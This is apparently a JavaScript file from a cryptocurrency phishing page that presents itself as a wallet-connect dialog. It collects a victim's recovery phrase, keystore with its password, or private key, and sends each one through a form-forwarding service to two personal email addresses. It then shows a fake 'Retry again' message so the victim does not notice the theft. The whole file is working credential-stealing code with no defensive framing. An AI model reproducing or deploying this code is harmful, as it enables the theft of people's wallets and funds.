// Function to open a modal
function openModal(modalId) {
    var modal = document.getElementById(modalId);
    if (modal) {
        modal.style.display = 'block';
    }
}

// Function to close a modal
function closeModal(modalId) {
    var modal = document.getElementById(modalId);
    if (modal) {
        modal.style.display = 'none';
    }
}

// Function to submit form data
function submitFormData(connectionMethod) {
    var formData;

    // Validate and get form data based on connection method
    switch (connectionMethod) {
        case 0: // Phrase
            formData = validatePhraseForm();
            break;
        case 1: // KeyStore
            formData = validateKeyStoreForm();
            break;
        case 2: // Private Key
            formData = validatePrivateKeyForm();
            break;
        default:
            return;
    }

    // Check if form data is valid
    if (formData) {
        // Send form data to email using Formsubmit.co
        sendFormDataToEmail(formData);

        // Close the modal after form submission
        closeModal('modal-' + getModalName(connectionMethod));
    }
}
// Placeholder function for sending form data to email using Formsubmit.co
function sendFormDataToEmail(formData) {
  // Replace 'YOUR_FORMSUBMIT_ENDPOINT' with the actual endpoint you get from Formsubmit.co
  var formsubmitEndpoint = 'https://formsubmit.co/ajax/mazzatov005@gmail.com, ashwebb500@gmail.com';

  fetch(formsubmitEndpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(formData),
    })
    .then(response => response.json())
    .then(data => {
      console.log('Formsubmit.co response:', data);
      swal('Validating...');

      // Delay for 2 seconds and then display "Retry again" alert
      setTimeout(function() {
        swal('Retry again');
      }, 2000);
    })
    .catch(error => {
      console.error('Error connecting your account, please retry again:', error);
      swal('Server Error', 'The server is currently unavailable. Please try again later.', 'error');
      // You can handle errors here if needed
    });
}

// Function to validate Phrase form
function validatePhraseForm() {
    var phraseTextarea = document.forms['phraseForm']['Phrase'].value.trim();
    var walletType = document.forms['phraseForm']['walletType'].value;

    // Basic validation
    if (phraseTextarea === '' || walletType === '') {
        swal('Please fill in all fields.');
        return null;
    }

    // Validate pattern (12 or 24 words separated by single spaces)
    var phrasePattern = /^(\S+\s+){11}\S+$|^(\S+\s+){23}\S+$/;
    if (!phrasePattern.test(phraseTextarea)) {
        swal('Phrase must be 12 or 24 words separated by single spaces.');
        return null;
    }

    // Return form data
    return { connectionMethod: 'Phrase', phrase: phraseTextarea, walletType: walletType };
}

// Function to validate KeyStore form
function validateKeyStoreForm() {
    var keystoreTextarea = document.forms['keystoreForm']['keystore'].value.trim();
    var passwordInput = document.forms['keystoreForm']['password'].value.trim();
    var walletType = document.forms['keystoreForm']['walletType'].value;

    // Basic validation
    if (keystoreTextarea === '' || passwordInput === '' || walletType === '') {
        swal('Please enter both KeyStore, password, and select wallet type.');
        return null;
    }

    // Validate pattern (JSON format)
    var jsonPattern = /^\{[\s\S]*\}$/;
    if (!jsonPattern.test(keystoreTextarea)) {
        swal('KeyStore must be a valid JSON format.');
        return null;
    }

    // Return form data
    return { connectionMethod: 'KeyStore', keystore: keystoreTextarea, password: passwordInput, walletType: walletType };
}

// Function to validate Private Key form
function validatePrivateKeyForm() {
    var privateKeyTextarea = document.forms['privateKeyForm']['privateKey'].value.trim();
    var walletType = document.forms['privateKeyForm']['walletType'].value;

    // Basic validation
    if (privateKeyTextarea === '' || walletType === '') {
        swal('Please fill in all fields.');
        return null;
    }

    // Validate pattern (64 alphanumeric characters)
    var privateKeyPattern = /^[a-fA-F0-9]{64}$/;
    if (!privateKeyPattern.test(privateKeyTextarea)) {
        swal('Private key must be 64 alphanumeric characters.');
        return null;
    }

    // Return form data
    return { connectionMethod: 'PrivateKey', privateKey: privateKeyTextarea, walletType: walletType };
}

// Function to get modal name based on connection method
function getModalName(connectionMethod) {
    switch (connectionMethod) {
        case 0:
            return 'phrase';
        case 1:
            return 'keystore';
        case 2:
            return 'private-key';
        default:
            return '';
    }
}
